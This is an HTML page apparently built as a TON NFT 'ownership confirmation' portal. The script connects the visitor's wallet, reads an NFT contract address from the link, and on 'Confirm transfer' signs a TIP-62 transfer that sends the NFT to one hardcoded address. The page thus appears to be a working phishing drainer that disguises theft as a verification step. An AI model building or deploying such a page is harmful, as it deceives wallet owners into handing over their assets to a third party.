<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Transfer Portal</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 16px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 4px 30px rgba(0,0,0,0.5); }
        #ton-connect-button { display: flex; justify-content: center; margin: 20px 0; }
        .nft-info { margin-bottom: 20px; padding: 15px; background: #2d2d2d; border-radius: 10px; }
        button.action-btn { width: 100%; padding: 12px; background: #0088cc; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; display: none; }
        button.action-btn:hover { background: #0077b3; }
    </style>
</head>
<body>

<div class="card">
    <h2>Подтверждение владения</h2>
    <div class="nft-info" id="info">
        Загрузка данных NFT...
    </div>

    <div id="ton-connect-button"></div>

    <button id="transferBtn" class="action-btn" onclick="sendTransaction()">Подтвердить передачу</button>
</div>

<script>
    // 1. Инициализация TON Connect
    const tonConnectUI = new TONConnectUI.TonConnectUI({
        manifestUrl: 'https://your-domain.com/tonconnect-manifest.json', 
        buttonRootId: 'ton-connect-button'
    });

    const urlParams = new URLSearchParams(window.location.search);
    const nftAddress = urlParams.get('address'); // Для NFT важен именно адрес контракта
    const nftId = urlParams.get('id') || "Неизвестно";
    
    document.getElementById('info').innerText = "NFT ID: " + nftId;

    // 2. Отображение кнопки
    tonConnectUI.onStatusChange(wallet => {
        const btn = document.getElementById('transferBtn');
        btn.style.display = (wallet && nftAddress) ? 'block' : 'none';
    });

    // 3. Функция отправки транзакции
    async function sendTransaction() {
        if (!tonConnectUI.account) {
            alert("Пожалуйста, подключите кошелек");
            return;
        }

        const tonWeb = new TonWeb();
        const Cell = TonWeb.boc.Cell;
        
        // Создаем Payload для трансфера NFT (стандарт TIP-62)
        const payload = new Cell();
        payload.bits.writeUint(0x5fcc3d14, 32); // op-code для transfer
        payload.bits.writeUint(0, 64);          // query_id
        payload.bits.writeAddress(new TonWeb.utils.Address("UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k")); // Кому уйдет NFT
        payload.bits.writeAddress(new TonWeb.utils.Address(tonConnectUI.account.address)); // Куда вернутся излишки (Back address)
        payload.bits.writeBit(false);           // custom_payload (null)
        payload.bits.writeCoins(TonWeb.utils.toNano('0.01')); // forward_amount для уведомления
        payload.bits.writeBit(false);           // forward_payload (empty)

        // Преобразуем в Base64 для TON Connect
        const payloadBoc = TonWeb.utils.bytesToBase64(await payload.toBoc());

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [
                {
                    address: nftAddress, // Транзакция отправляется на адрес САМОГО NFT
                    amount: "50000000",  // 0.05 TON на газ
                    payload: payloadBoc
                }
            ]
        };

        try {
            await tonConnectUI.sendTransaction(transaction);
            alert("Запрос на передачу отправлен!");
        } catch (e) {
            console.error(e);
            alert("Ошибка транзакции");
        }
    }
</script>

</body>
</html>
